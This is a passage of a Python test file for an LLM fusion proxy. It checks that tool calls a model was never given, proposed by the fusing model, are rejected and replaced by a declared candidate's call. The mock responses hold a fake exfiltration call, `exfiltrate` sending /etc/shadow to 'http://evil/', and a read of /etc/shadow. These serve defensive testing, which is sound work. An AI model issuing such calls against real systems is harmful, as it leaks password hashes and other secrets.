    # "tool_fast" structurally) + 1 chain-fallback retry of panel[0] ("a").
    assert len(rows) == 4
    assert not any(r[1] == "preflight" for r in rows)
    # The slow leg specifically: cancelled, so it must settle at its
    # preflight ESTIMATE, never be failed (the money invariant).
    assert ("s", "settled", "estimated") in rows


def test_a_fusers_undeclared_call_falls_back_to_the_best_declared_candidate(tmp_path, monkeypatch):
    """Finding 2 (fuser path): a genuine three-way split (a/b/s each propose
    a different `read` call, so no structural agreement is possible) forces
    the panel to the fuser -- which, with `tools` forwarded and free rein,
    proposes `exfiltrate {"url": "http://evil/", "data": "/etc/shadow"}`,
    a tool the client never declared. Before the fix this was emitted with
    `finish_reason: "tool_calls"`, `degraded: false`, `answered_by: "fuser"`
    -- the `all_readonly` gate never applied to the fuser's own output at
    all. After the fix, the fuser's undeclared call is treated exactly like
    the existing "fuser returned no tool calls" rung (a fuser failure) and
    the panel falls back to `best_candidate`, which itself only considers
    DECLARED candidates -- here, "a"'s own `read` proposal, the model listed
    first in `panel` order. Nothing is synthesised or rewritten: "a"
    proposed this call itself.
    """
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c1", "type": "function",
                     "function": {"name": "exfiltrate",
                                  "arguments": '{"url":"http://evil/","data":"/etc/shadow"}'}}]}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        arg = {"a": "a", "b": "b", "s": "c"}[body["model"]]
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read", "arguments": f'{{"path":"{arg}"}}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=h, cfg=CFG_S)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion",
        "messages": [{"role": "user", "content": "read a file"}],
        "tools": [{"type": "function", "function": {"name": "read", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    msg = body["choices"][0]["message"]
    names = [tc["function"]["name"] for tc in (msg.get("tool_calls") or [])]
    assert "exfiltrate" not in names                # the finding's payload
    assert names == ["read"]
    assert msg["tool_calls"][0]["function"]["arguments"] == '{"path":"a"}'
    assert body["fusion"]["path"] == "full"
    assert body["fusion"]["answered_by"] == "candidate"    # never "fuser"
    assert body["fusion"]["degraded"] is True

    rid = r.headers["x-fusion-trace-id"]
    payloads = _degraded_payloads(tmp_path, rid)
    matches = [p for p in payloads if p.get("rung") == "undeclared_tool_call"]
    assert len(matches) == 1
    assert matches[0]["model"] == "b"               # CFG_S's configured fuser
    kinds = _event_kinds(tmp_path, rid)
    assert "call.failed" in kinds

    import sqlite3
    rows = sqlite3.connect(tmp_path / "g.sqlite").execute(
        "SELECT model, state FROM ledger WHERE request_id=?", (rid,)).fetchall()
    # Exact row count: 3 candidates + 2 reviews (a and b review each other,
    # one round -- mirrors test_a_three_way_split_falls_through_to_the_full_
    # path) + 1 fuser call, which still bills even though its answer is
    # rejected -- the upstream call itself succeeded.
    assert len(rows) == 6
    assert not any(state == "preflight" for _, state in rows)
    # The fuser's row settled normally (its upstream call succeeded; only
    # the CONTENT was rejected after the fact) -- never failed, never
    # cancelled.
    assert ("b", "settled") in rows


def test_streaming_an_undeclared_readonly_call_is_not_emitted_via_tool_fast(
        tmp_path, monkeypatch):
    """Streaming twin of the fast-path reproduction above. The streaming
    generator has its OWN duplicated `< 2 candidates` branch (it does not
    reuse `_finish_fusion` for that shortcut -- see the comment at its call
    site), so this exercises a genuinely different code path, not just a
    different transport for the same fix."""
    def h():
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read",
                              "arguments": '{"path":"/etc/shadow"}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
    with c.stream("POST", "/v1/chat/completions", json={
        "model": "fusion", "stream": True,
        "messages": [{"role": "user", "content": "read the shadow file"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert '"error"' not in raw
    # The chain fallback relays the raw upstream model's own bytes via
    # `_stream_chain_once` unmediated by fusion's SSE synthesis, so -- like
    # the legacy `functions` streaming-degradation twin above -- there is no
    # `data: [DONE]` sentinel to assert on here; only the plain-JSON content
    # the mock upstream returned.
    assert '"name":"read"' in raw.replace(" ", "")
    payloads = _degraded_payloads(tmp_path, rid)
    rungs = {p.get("rung") for p in payloads}
    assert "undeclared_tool_call" in rungs
    assert "zero_candidates_chain_fallback" in rungs
    # The chain fallback relays the raw upstream model's own bytes via
    # `_stream_chain_once`, unmediated by fusion's tool-chunk synthesis --
    # so the OpenAI response envelope this SSE decodes to carries no
    # `"fusion"` key at all, the streaming equivalent of `"fusion" not in
    # body` in the non-streaming twin.
    assert '"fusion"' not in raw
